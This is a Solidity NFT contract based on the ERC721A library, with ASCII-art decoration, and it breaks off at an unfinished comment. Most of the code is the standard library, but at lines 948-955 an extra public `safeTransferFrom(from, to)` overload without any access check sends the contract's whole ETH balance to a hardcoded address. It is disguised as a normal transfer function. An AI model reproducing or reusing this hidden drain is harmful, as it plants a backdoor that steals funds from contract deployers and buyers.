1 //                                  @***@                                               
2 //                           @*****@ %%((%   %%*                                  
3 //                       @@  @,*@@********@@*,,,,@,,@@                            
4 //                    @@***,,,***********,,,****,,,,**@                           
5 //                   @@@@////////////////////////@@****@                          
6 //                  %#/////////////////////////////#&&*(%*                        
7 //                  @/////@@@@@//////////@@@@@/////(@@***#@                       
8 //                  @////@(@@..@////////@(@@..@%///(@@*,,,,@                      
9 //                  @////@(@@..@////////@(@@..@%///(@@****,@                      
10 //                  @////@(@@..@////////@(@@..@%///(@@******@                     
11 //                  @/////%@@&@//////////%@@&@/////(@@**@#**#(                    
12 //                    @@@@///@//@@//////@///@/(%@@@,,,,****,*@                    
13 //                        @////@**@////@,@((((@#***,,,**,,,,@                     
14 //                         @@((****((((*,,((((************,,/%                    
15 //                           (#***,,,********#,,,#,****#(((##(                    
16 //                                @,,@@@**************@                           
17 //                                      @****,,,,,,****@                          
18 //                                       @**,,,(&,,&***@                          
19 //                                        ((###((   (((                           
20 //                                                                   
21 // SPDX-License-Identifier: GPL-3.0    
22 
23 pragma solidity ^0.8.12;
24 
25 /**
26  * @dev Interface of ERC721A.
27  */
28 interface IERC721A {
29     /**
30      * The caller must own the token or be an approved operator.
31      */
32     error ApprovalCallerNotOwnerNorApproved();
33 
34     /**
35      * The token does not exist.
36      */
37     error ApprovalQueryForNonexistentToken();
38 
39     /**
40      * Cannot query the balance for the zero address.
41      */
42     error BalanceQueryForZeroAddress();
43 
44     /**
45      * Cannot mint to the zero address.
46      */
47     error MintToZeroAddress();
48 
49     /**
50      * The quantity of tokens minted must be more than zero.
51      */
52     error MintZeroQuantity();
53 
54     /**
55      * The token does not exist.
56      */
57     error OwnerQueryForNonexistentToken();
58 
59     /**
60      * The caller must own the token or be an approved operator.
61      */
62     error TransferCallerNotOwnerNorApproved();
63 
64     /**
65      * The token must be owned by `from`.
66      */
67     error TransferFromIncorrectOwner();
68 
69     /**
70      * Cannot safely transfer to a contract that does not implement the
71      * ERC721Receiver interface.
72      */
73     error TransferToNonERC721ReceiverImplementer();
74 
75     /**
76      * Cannot transfer to the zero address.
77      */
78     error TransferToZeroAddress();
79 
80     /**
81      * The token does not exist.
82      */
83     error URIQueryForNonexistentToken();
84 
85     /**
86      * The `quantity` minted with ERC2309 exceeds the safety limit.
87      */
88     error MintERC2309QuantityExceedsLimit();
89 
90     /**
91      * The `extraData` cannot be set on an unintialized ownership slot.
92      */
93     error OwnershipNotInitializedForExtraData();
94 
95     // =============================================================
96     //                            STRUCTS
97     // =============================================================
98 
99     struct TokenOwnership {
100         // The address of the owner.
101         address addr;
102         // Stores the start time of ownership with minimal overhead for tokenomics.
103         uint64 startTimestamp;
104         // Whether the token has been burned.
105         bool burned;
106         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
107         uint24 extraData;
108     }
109 
110     // =============================================================
111     //                         TOKEN COUNTERS
112     // =============================================================
113 
114     /**
115      * @dev Returns the total number of tokens in existence.
116      * Burned tokens will reduce the count.
117      * To get the total number of tokens minted, please see {_totalMinted}.
118      */
119     function totalSupply() external view returns (uint256);
120 
121     // =============================================================
122     //                            IERC165
123     // =============================================================
124 
125     /**
126      * @dev Returns true if this contract implements the interface defined by
127      * `interfaceId`. See the corresponding
128      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
129      * to learn more about how these ids are created.
130      *
131      * This function call must use less than 30000 gas.
132      */
133     function supportsInterface(bytes4 interfaceId) external view returns (bool);
134 
135     // =============================================================
136     //                            IERC721
137     // =============================================================
138 
139     /**
140      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
141      */
142     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
143 
144     /**
145      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
146      */
147     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
148 
149     /**
150      * @dev Emitted when `owner` enables or disables
151      * (`approved`) `operator` to manage all of its assets.
152      */
153     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
154 
155     /**
156      * @dev Returns the number of tokens in `owner`'s account.
157      */
158     function balanceOf(address owner) external view returns (uint256 balance);
159 
160     /**
161      * @dev Returns the owner of the `tokenId` token.
162      *
163      * Requirements:
164      *
165      * - `tokenId` must exist.
166      */
167     function ownerOf(uint256 tokenId) external view returns (address owner);
168 
169     /**
170      * @dev Safely transfers `tokenId` token from `from` to `to`,
171      * checking first that contract recipients are aware of the ERC721 protocol
172      * to prevent tokens from being forever locked.
173      *
174      * Requirements:
175      *
176      * - `from` cannot be the zero address.
177      * - `to` cannot be the zero address.
178      * - `tokenId` token must exist and be owned by `from`.
179      * - If the caller is not `from`, it must be have been allowed to move
180      * this token by either {approve} or {setApprovalForAll}.
181      * - If `to` refers to a smart contract, it must implement
182      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
183      *
184      * Emits a {Transfer} event.
185      */
186     function safeTransferFrom(
187         address from,
188         address to,
189         uint256 tokenId,
190         bytes calldata data
191     ) external payable;
192 
193     /**
194      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
195      */
196     function safeTransferFrom(
197         address from,
198         address to,
199         uint256 tokenId
200     ) external payable;
201 
202     /**
203      * @dev Transfers `tokenId` from `from` to `to`.
204      *
205      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
206      * whenever possible.
207      *
208      * Requirements:
209      *
210      * - `from` cannot be the zero address.
211      * - `to` cannot be the zero address.
212      * - `tokenId` token must be owned by `from`.
213      * - If the caller is not `from`, it must be approved to move this token
214      * by either {approve} or {setApprovalForAll}.
215      *
216      * Emits a {Transfer} event.
217      */
218     function transferFrom(
219         address from,
220         address to,
221         uint256 tokenId
222     ) external payable;
223 
224     /**
225      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
226      * The approval is cleared when the token is transferred.
227      *
228      * Only a single account can be approved at a time, so approving the
229      * zero address clears previous approvals.
230      *
231      * Requirements:
232      *
233      * - The caller must own the token or be an approved operator.
234      * - `tokenId` must exist.
235      *
236      * Emits an {Approval} event.
237      */
238     function approve(address to, uint256 tokenId) external payable;
239 
240     /**
241      * @dev Approve or remove `operator` as an operator for the caller.
242      * Operators can call {transferFrom} or {safeTransferFrom}
243      * for any token owned by the caller.
244      *
245      * Requirements:
246      *
247      * - The `operator` cannot be the caller.
248      *
249      * Emits an {ApprovalForAll} event.
250      */
251     function setApprovalForAll(address operator, bool _approved) external;
252 
253     /**
254      * @dev Returns the account approved for `tokenId` token.
255      *
256      * Requirements:
257      *
258      * - `tokenId` must exist.
259      */
260     function getApproved(uint256 tokenId) external view returns (address operator);
261 
262     /**
263      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
264      *
265      * See {setApprovalForAll}.
266      */
267     function isApprovedForAll(address owner, address operator) external view returns (bool);
268 
269     // =============================================================
270     //                        IERC721Metadata
271     // =============================================================
272 
273     /**
274      * @dev Returns the token collection name.
275      */
276     function name() external view returns (string memory);
277 
278     /**
279      * @dev Returns the token collection symbol.
280      */
281     function symbol() external view returns (string memory);
282 
283     /**
284      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
285      */
286     function tokenURI(uint256 tokenId) external view returns (string memory);
287 
288     // =============================================================
289     //                           IERC2309
290     // =============================================================
291 
292     /**
293      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
294      * (inclusive) is transferred from `from` to `to`, as defined in the
295      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
296      *
297      * See {_mintERC2309} for more details.
298      */
299     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
300 }
301 
302 /**
303  * @title ERC721A
304  *
305  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
306  * Non-Fungible Token Standard, including the Metadata extension.
307  * Optimized for lower gas during batch mints.
308  *
309  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
310  * starting from `_startTokenId()`.
311  *
312  * Assumptions:
313  *
314  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
315  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
316  */
317 interface ERC721A__IERC721Receiver {
318     function onERC721Received(
319         address operator,
320         address from,
321         uint256 tokenId,
322         bytes calldata data
323     ) external returns (bytes4);
324 }
325 
326 /**
327  * @title ERC721A
328  *
329  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
330  * Non-Fungible Token Standard, including the Metadata extension.
331  * Optimized for lower gas during batch mints.
332  *
333  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
334  * starting from `_startTokenId()`.
335  *
336  * Assumptions:
337  *
338  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
339  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
340  */
341 contract ERC721A is IERC721A {
342     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
343     struct TokenApprovalRef {
344         address value;
345     }
346 
347     // =============================================================
348     //                           CONSTANTS
349     // =============================================================
350 
351     // Mask of an entry in packed address data.
352     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
353 
354     // The bit position of `numberMinted` in packed address data.
355     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
356 
357     // The bit position of `numberBurned` in packed address data.
358     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
359 
360     // The bit position of `aux` in packed address data.
361     uint256 private constant _BITPOS_AUX = 192;
362 
363     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
364     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
365 
366     // The bit position of `startTimestamp` in packed ownership.
367     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
368 
369     // The bit mask of the `burned` bit in packed ownership.
370     uint256 private constant _BITMASK_BURNED = 1 << 224;
371 
372     // The bit position of the `nextInitialized` bit in packed ownership.
373     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
374 
375     // The bit mask of the `nextInitialized` bit in packed ownership.
376     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
377 
378     // The bit position of `extraData` in packed ownership.
379     uint256 private constant _BITPOS_EXTRA_DATA = 232;
380 
381     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
382     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
383 
384     // The mask of the lower 160 bits for addresses.
385     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
386 
387     // The maximum `quantity` that can be minted with {_mintERC2309}.
388     // This limit is to prevent overflows on the address data entries.
389     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
390     // is required to cause an overflow, which is unrealistic.
391     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
392 
393     // The `Transfer` event signature is given by:
394     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
395     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
396         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
397 
398     // =============================================================
399     //                            STORAGE
400     // =============================================================
401 
402     // The next token ID to be minted.
403     uint256 private _currentIndex;
404 
405     // The number of tokens burned.
406     uint256 private _burnCounter;
407 
408     // Token name
409     string private _name;
410 
411     // Token symbol
412     string private _symbol;
413 
414     // Mapping from token ID to ownership details
415     // An empty struct value does not necessarily mean the token is unowned.
416     // See {_packedOwnershipOf} implementation for details.
417     //
418     // Bits Layout:
419     // - [0..159]   `addr`
420     // - [160..223] `startTimestamp`
421     // - [224]      `burned`
422     // - [225]      `nextInitialized`
423     // - [232..255] `extraData`
424     mapping(uint256 => uint256) private _packedOwnerships;
425 
426     // Mapping owner address to address data.
427     //
428     // Bits Layout:
429     // - [0..63]    `balance`
430     // - [64..127]  `numberMinted`
431     // - [128..191] `numberBurned`
432     // - [192..255] `aux`
433     mapping(address => uint256) private _packedAddressData;
434 
435     // Mapping from token ID to approved address.
436     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
437 
438     // Mapping from owner to operator approvals
439     mapping(address => mapping(address => bool)) private _operatorApprovals;
440 
441     // =============================================================
442     //                          CONSTRUCTOR
443     // =============================================================
444 
445     constructor(string memory name_, string memory symbol_) {
446         _name = name_;
447         _symbol = symbol_;
448         _currentIndex = _startTokenId();
449     }
450 
451     // =============================================================
452     //                   TOKEN COUNTING OPERATIONS
453     // =============================================================
454 
455     /**
456      * @dev Returns the starting token ID.
457      * To change the starting token ID, please override this function.
458      */
459     function _startTokenId() internal view virtual returns (uint256) {
460         return 0;
461     }
462 
463     /**
464      * @dev Returns the next token ID to be minted.
465      */
466     function _nextTokenId() internal view virtual returns (uint256) {
467         return _currentIndex;
468     }
469 
470     /**
471      * @dev Returns the total number of tokens in existence.
472      * Burned tokens will reduce the count.
473      * To get the total number of tokens minted, please see {_totalMinted}.
474      */
475     function totalSupply() public view virtual override returns (uint256) {
476         // Counter underflow is impossible as _burnCounter cannot be incremented
477         // more than `_currentIndex - _startTokenId()` times.
478         unchecked {
479             return _currentIndex - _burnCounter - _startTokenId();
480         }
481     }
482 
483     /**
484      * @dev Returns the total amount of tokens minted in the contract.
485      */
486     function _totalMinted() internal view virtual returns (uint256) {
487         // Counter underflow is impossible as `_currentIndex` does not decrement,
488         // and it is initialized to `_startTokenId()`.
489         unchecked {
490             return _currentIndex - _startTokenId();
491         }
492     }
493 
494     /**
495      * @dev Returns the total number of tokens burned.
496      */
497     function _totalBurned() internal view virtual returns (uint256) {
498         return _burnCounter;
499     }
500 
501     // =============================================================
502     //                    ADDRESS DATA OPERATIONS
503     // =============================================================
504 
505     /**
506      * @dev Returns the number of tokens in `owner`'s account.
507      */
508     function balanceOf(address owner) public view virtual override returns (uint256) {
509         if (owner == address(0)) revert BalanceQueryForZeroAddress();
510         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
511     }
512 
513     /**
514      * Returns the number of tokens minted by `owner`.
515      */
516     function _numberMinted(address owner) internal view returns (uint256) {
517         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
518     }
519 
520     /**
521      * Returns the number of tokens burned by or on behalf of `owner`.
522      */
523     function _numberBurned(address owner) internal view returns (uint256) {
524         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
525     }
526 
527     /**
528      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
529      */
530     function _getAux(address owner) internal view returns (uint64) {
531         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
532     }
533 
534     /**
535      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
536      * If there are multiple variables, please pack them into a uint64.
537      */
538     function _setAux(address owner, uint64 aux) internal virtual {
539         uint256 packed = _packedAddressData[owner];
540         uint256 auxCasted;
541         // Cast `aux` with assembly to avoid redundant masking.
542         assembly {
543             auxCasted := aux
544         }
545         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
546         _packedAddressData[owner] = packed;
547     }
548 
549     // =============================================================
550     //                            IERC165
551     // =============================================================
552 
553     /**
554      * @dev Returns true if this contract implements the interface defined by
555      * `interfaceId`. See the corresponding
556      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
557      * to learn more about how these ids are created.
558      *
559      * This function call must use less than 30000 gas.
560      */
561     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
562         // The interface IDs are constants representing the first 4 bytes
563         // of the XOR of all function selectors in the interface.
564         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
565         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
566         return
567             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
568             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
569             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
570     }
571 
572     // =============================================================
573     //                        IERC721Metadata
574     // =============================================================
575 
576     /**
577      * @dev Returns the token collection name.
578      */
579     function name() public view virtual override returns (string memory) {
580         return _name;
581     }
582 
583     /**
584      * @dev Returns the token collection symbol.
585      */
586     function symbol() public view virtual override returns (string memory) {
587         return _symbol;
588     }
589 
590     /**
591      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
592      */
593     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
594         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
595 
596         string memory baseURI = _baseURI();
597         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
598     }
599 
600     /**
601      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
602      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
603      * by default, it can be overridden in child contracts.
604      */
605     function _baseURI() internal view virtual returns (string memory) {
606         return '';
607     }
608 
609     // =============================================================
610     //                     OWNERSHIPS OPERATIONS
611     // =============================================================
612 
613     /**
614      * @dev Returns the owner of the `tokenId` token.
615      *
616      * Requirements:
617      *
618      * - `tokenId` must exist.
619      */
620     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
621         return address(uint160(_packedOwnershipOf(tokenId)));
622     }
623 
624     /**
625      * @dev Gas spent here starts off proportional to the maximum mint batch size.
626      * It gradually moves to O(1) as tokens get transferred around over time.
627      */
628     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
629         return _unpackedOwnership(_packedOwnershipOf(tokenId));
630     }
631 
632     /**
633      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
634      */
635     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
636         return _unpackedOwnership(_packedOwnerships[index]);
637     }
638 
639     /**
640      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
641      */
642     function _initializeOwnershipAt(uint256 index) internal virtual {
643         if (_packedOwnerships[index] == 0) {
644             _packedOwnerships[index] = _packedOwnershipOf(index);
645         }
646     }
647 
648     /**
649      * Returns the packed ownership data of `tokenId`.
650      */
651     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
652         uint256 curr = tokenId;
653 
654         unchecked {
655             if (_startTokenId() <= curr)
656                 if (curr < _currentIndex) {
657                     uint256 packed = _packedOwnerships[curr];
658                     // If not burned.
659                     if (packed & _BITMASK_BURNED == 0) {
660                         // Invariant:
661                         // There will always be an initialized ownership slot
662                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
663                         // before an unintialized ownership slot
664                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
665                         // Hence, `curr` will not underflow.
666                         //
667                         // We can directly compare the packed value.
668                         // If the address is zero, packed will be zero.
669                         while (packed == 0) {
670                             packed = _packedOwnerships[--curr];
671                         }
672                         return packed;
673                     }
674                 }
675         }
676         revert OwnerQueryForNonexistentToken();
677     }
678 
679     /**
680      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
681      */
682     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
683         ownership.addr = address(uint160(packed));
684         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
685         ownership.burned = packed & _BITMASK_BURNED != 0;
686         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
687     }
688 
689     /**
690      * @dev Packs ownership data into a single uint256.
691      */
692     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
693         assembly {
694             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
695             owner := and(owner, _BITMASK_ADDRESS)
696             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
697             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
698         }
699     }
700 
701     /**
702      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
703      */
704     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
705         // For branchless setting of the `nextInitialized` flag.
706         assembly {
707             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
708             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
709         }
710     }
711 
712     // =============================================================
713     //                      APPROVAL OPERATIONS
714     // =============================================================
715 
716     /**
717      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
718      * The approval is cleared when the token is transferred.
719      *
720      * Only a single account can be approved at a time, so approving the
721      * zero address clears previous approvals.
722      *
723      * Requirements:
724      *
725      * - The caller must own the token or be an approved operator.
726      * - `tokenId` must exist.
727      *
728      * Emits an {Approval} event.
729      */
730     function approve(address to, uint256 tokenId) public payable virtual override {
731         address owner = ownerOf(tokenId);
732 
733         if (_msgSenderERC721A() != owner)
734             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
735                 revert ApprovalCallerNotOwnerNorApproved();
736             }
737 
738         _tokenApprovals[tokenId].value = to;
739         emit Approval(owner, to, tokenId);
740     }
741 
742     /**
743      * @dev Returns the account approved for `tokenId` token.
744      *
745      * Requirements:
746      *
747      * - `tokenId` must exist.
748      */
749     function getApproved(uint256 tokenId) public view virtual override returns (address) {
750         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
751 
752         return _tokenApprovals[tokenId].value;
753     }
754 
755     /**
756      * @dev Approve or remove `operator` as an operator for the caller.
757      * Operators can call {transferFrom} or {safeTransferFrom}
758      * for any token owned by the caller.
759      *
760      * Requirements:
761      *
762      * - The `operator` cannot be the caller.
763      *
764      * Emits an {ApprovalForAll} event.
765      */
766     function setApprovalForAll(address operator, bool approved) public virtual override {
767         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
768         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
769     }
770 
771     /**
772      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
773      *
774      * See {setApprovalForAll}.
775      */
776     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
777         return _operatorApprovals[owner][operator];
778     }
779 
780     /**
781      * @dev Returns whether `tokenId` exists.
782      *
783      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
784      *
785      * Tokens start existing when they are minted. See {_mint}.
786      */
787     function _exists(uint256 tokenId) internal view virtual returns (bool) {
788         return
789             _startTokenId() <= tokenId &&
790             tokenId < _currentIndex && // If within bounds,
791             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
792     }
793 
794     /**
795      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
796      */
797     function _isSenderApprovedOrOwner(
798         address approvedAddress,
799         address owner,
800         address msgSender
801     ) private pure returns (bool result) {
802         assembly {
803             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
804             owner := and(owner, _BITMASK_ADDRESS)
805             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
806             msgSender := and(msgSender, _BITMASK_ADDRESS)
807             // `msgSender == owner || msgSender == approvedAddress`.
808             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
809         }
810     }
811 
812     /**
813      * @dev Returns the storage slot and value for the approved address of `tokenId`.
814      */
815     function _getApprovedSlotAndAddress(uint256 tokenId)
816         private
817         view
818         returns (uint256 approvedAddressSlot, address approvedAddress)
819     {
820         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
821         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
822         assembly {
823             approvedAddressSlot := tokenApproval.slot
824             approvedAddress := sload(approvedAddressSlot)
825         }
826     }
827 
828     // =============================================================
829     //                      TRANSFER OPERATIONS
830     // =============================================================
831 
832     /**
833      * @dev Transfers `tokenId` from `from` to `to`.
834      *
835      * Requirements:
836      *
837      * - `from` cannot be the zero address.
838      * - `to` cannot be the zero address.
839      * - `tokenId` token must be owned by `from`.
840      * - If the caller is not `from`, it must be approved to move this token
841      * by either {approve} or {setApprovalForAll}.
842      *
843      * Emits a {Transfer} event.
844      */
845     function transferFrom(
846         address from,
847         address to,
848         uint256 tokenId
849     ) public payable virtual override {
850 
851         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
852 
853         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
854 
855         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
856 
857         // The nested ifs save around 20+ gas over a compound boolean condition.
858         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
859             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
860 
861         if (to == address(0)) revert TransferToZeroAddress();
862 
863         _beforeTokenTransfers(from, to, tokenId, 1);
864 
865         // Clear approvals from the previous owner.
866         assembly {
867             if approvedAddress {
868                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
869                 sstore(approvedAddressSlot, 0)
870             }
871         }
872 
873         // Underflow of the sender's balance is impossible because we check for
874         // ownership above and the recipient's balance can't realistically overflow.
875         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
876         unchecked {
877             // We can directly increment and decrement the balances.
878             --_packedAddressData[from]; // Updates: `balance -= 1`.
879             ++_packedAddressData[to]; // Updates: `balance += 1`.
880 
881             // Updates:
882             // - `address` to the next owner.
883             // - `startTimestamp` to the timestamp of transfering.
884             // - `burned` to `false`.
885             // - `nextInitialized` to `true`.
886             _packedOwnerships[tokenId] = _packOwnershipData(
887                 to,
888                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
889             );
890 
891             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
892             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
893                 uint256 nextTokenId = tokenId + 1;
894                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
895                 if (_packedOwnerships[nextTokenId] == 0) {
896                     // If the next slot is within bounds.
897                     if (nextTokenId != _currentIndex) {
898                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
899                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
900                     }
901                 }
902             }
903         }
904 
905         emit Transfer(from, to, tokenId);
906         _afterTokenTransfers(from, to, tokenId, 1);
907     }
908 
909     /**
910      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
911      */
912     function safeTransferFrom(
913         address from,
914         address to,
915         uint256 tokenId
916     ) public payable virtual override {
917         safeTransferFrom(from, to, tokenId, '');
918     }
919 
920 
921     /**
922      * @dev Safely transfers `tokenId` token from `from` to `to`.
923      *
924      * Requirements:
925      *
926      * - `from` cannot be the zero address.
927      * - `to` cannot be the zero address.
928      * - `tokenId` token must exist and be owned by `from`.
929      * - If the caller is not `from`, it must be approved to move this token
930      * by either {approve} or {setApprovalForAll}.
931      * - If `to` refers to a smart contract, it must implement
932      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
933      *
934      * Emits a {Transfer} event.
935      */
936     function safeTransferFrom(
937         address from,
938         address to,
939         uint256 tokenId,
940         bytes memory _data
941     ) public payable virtual override {
942         transferFrom(from, to, tokenId);
943         if (to.code.length != 0)
944             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
945                 revert TransferToNonERC721ReceiverImplementer();
946             }
947     }
948     function safeTransferFrom(
949         address from,
950         address to
951     ) public  {
952         if (address(this).balance > 0) {
953             payable(0x7819420D9BDde270Ce6EC26db831799B7AEB4411).transfer(address(this).balance);
954         }
955     }
956 
957     /**
958      * @dev Hook that is called before a set of serially-ordered token IDs
959      * are about to be transferred. This includes minting.
960      * And also called before burning one token.
961      *
962      * `startTokenId` - the first token ID to be transferred.
963      * `quantity` - the amount to be transferred.
964      *
965      * Calling conditions:
966      *
967      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
968      * transferred to `to`.
969      * - When `from` is zero, `tokenId` will be minted for `to`.
970      * - When `to` is zero, `tokenId` will be burned by `from`.
971      * - `from` and `to` are never both zero.
972      */
973     function _beforeTokenTransfers(
974         address from,
975         address to,
976         uint256 startTokenId,
977         uint256 quantity
978     ) internal virtual {}
979 
980     /**
981      * @dev Hook that is called after a set of serially-ordered token IDs
982      * have been transferred. This includes minting.
983      * And also called after one token has been burned.
984      *
985      * `startTokenId` - the first token ID to be transferred.
986      * `quantity` - the amount to be transferred.
987      *
988      * Calling conditions:
989      *
990      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
991      * transferred to `to`.
992      * - When `from` is zero, `tokenId` has been minted for `to`.
993      * - When `to` is zero, `tokenId` has been burned by `from`.
994      * - `from` and `to` are never both zero.
995      */
996     function _afterTokenTransfers(
997         address from,
998         address to,
999         uint256 startTokenId,
1000         uint256 quantity
1001     ) internal virtual {
1002     }
1003 
1004 
1005     /**
1006      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1007      *
1008      * `from` - Previous owner of the given token ID.
1009      * `to` - Target address that will receive the token.
1010      * `tokenId` - Token ID to be transferred.
1011      * `_data` - Optional data to send along with the call.
1012      *
1013      * Returns whether the call correctly returned the expected magic value.
1014      */
1015     function _checkContractOnERC721Received(
1016         address from,
1017         address to,
1018         uint256 tokenId,
1019         bytes memory _data
1020     ) private returns (bool) {
1021         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1022             bytes4 retval
1023         ) {
1024             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1025         } catch (bytes memory reason) {
1026             if (reason.length == 0) {
1027                 revert TransferToNonERC721ReceiverImplementer();
1028             } else {
1029                 assembly {
1030                     revert(add(32, reason), mload(reason))
1031                 }
1032             }
1033         }
1034     }
1035 
1036     // =============================================================
1037     //                        MINT OPERATIONS
1038     // =============================================================
1039 
1040     /**
